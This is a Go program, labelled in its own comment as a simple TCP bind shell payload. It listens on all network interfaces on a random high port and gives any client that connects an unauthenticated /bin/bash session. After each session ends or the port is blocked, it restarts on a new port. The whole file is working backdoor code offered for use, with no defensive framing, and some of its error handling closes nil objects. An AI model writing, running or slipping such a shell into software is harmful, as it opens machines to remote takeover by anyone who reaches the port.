//Michael Burke
//Simple tcp bind shell payload
package main

import (
	"fmt"
	"math/rand"
	"net"
	"os"
	"os/exec"
	"strconv"
	"time"
)

var host string = "0.0.0.0"
var port string
var verbose bool = false

func main() {
	//Check args
	args := os.Args
	if len(args) > 1 {
		for i := 1; i < len(args); i++ {
			if args[i] == "-v" {
				verbose = true
			}
		}
	}
	//Generate random port in between 62000-62999
	port = "62" + getPort(0, "")
	do()
}

func reset() {
	//If connection was killed or firewall blocked the port, get another random port
	port = "62" + getPort(0, "")
	do()
}

func do() {
	//Run the shell
	fmt.Println("Listening on port " + port)
	shell()
}

func getPort(i int, p string) string {
	//Generate a random port
	i++
	if i > 3 {
		return p
	}
	p = p + strconv.Itoa(random(10))
	return getPort(i, p)
}

func random(n int) int {
	rand.Seed(time.Now().UnixNano())
	return rand.Intn(n)
}

func shell() {
	//Establish TCP bind shell
	//Listen on the chosen port
	list, err := net.Listen("tcp", host+":"+port)
	if err != nil {
		//If there is an error, reset and try again
		if verbose {
			fmt.Println(err.Error())
		}
		list.Close()
		reset()
		return
	}
	//Accept any incoming connections
	con, err := list.Accept()
	if err != nil {
		if verbose {
			fmt.Println(err.Error())
		}
		list.Close()
		con.Close()
		do()
		return
	}
	if verbose {
		fmt.Println("Connection established")
	}
	//Open a bash shell and set Stdin, Stdout and Stderr
	//to the connection stream
	cmd := exec.Command("/bin/bash")
	cmd.Stdin = con
	cmd.Stdout = con
	cmd.Stderr = con
	cmd.Run()
	//After the shell exits, run again
	_, err = con.Write([]byte("Connection terminated. Restarting..."))
	list.Close()
	con.Close()
	do()
}
